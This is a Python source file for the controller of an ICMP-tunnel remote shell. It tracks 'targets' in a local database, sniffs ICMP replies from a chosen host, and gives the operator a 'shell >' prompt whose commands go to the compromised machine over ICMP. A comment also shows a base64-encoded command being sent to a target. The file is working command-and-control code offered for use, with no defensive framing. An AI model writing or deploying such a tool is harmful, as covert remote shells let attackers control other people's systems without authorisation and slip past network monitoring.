#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
import argparse
from multiprocessing import Process, Manager

manager = Manager()
mock_stdout = manager.Value(str, "")

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')


    def list_hosts(self):
        response = "[ Targets ]\n"

        targets = self.db.all()
        for target in targets:
            response += f"[*] {target['id']}\n"
            response += f" --> {target['ip']}\n"
            response += f" --> {target['status']}\n"
        
        return response

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.id == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if len(mock_stdout.value) != 0:
                cmd = input(colored("shell > ", "red")).encode()
                if len(cmd) != 0:
                    self.send(target['ip'], "instruction", cmd)
                    
                    

    def instruction(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            mock_stdout.value += shellpack['data'].decode()
        elif shellpack['option'] == "COMPLETE":
            mock_stdout.value += shellpack['data'].decode()
            print(mock_stdout.value)
            mock_stdout.value = ""
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
        else:
            print(f"{shellpack['data'].decode()}")

if __name__ == "__main__":
    controller = Controller()
    

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(sys.argv[2]))

            
    
    
